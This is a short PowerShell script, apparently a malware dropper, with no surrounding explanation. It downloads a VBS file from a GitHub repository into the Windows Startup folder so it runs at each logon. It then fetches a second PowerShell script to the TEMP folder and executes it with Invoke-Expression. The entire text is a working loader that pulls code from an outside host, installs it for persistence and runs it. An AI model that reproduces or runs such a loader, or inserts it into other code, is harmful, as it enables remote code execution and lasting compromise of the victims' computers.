$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/WINOB.vbs"
$output6 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WINOB.vbs"
Invoke-WebRequest -Uri $url6 -OutFile $output6
$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
$output5 = "$env:TEMP\RUNS.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
IEX ((New-Object Net.WebClient).DownloadString($output5))
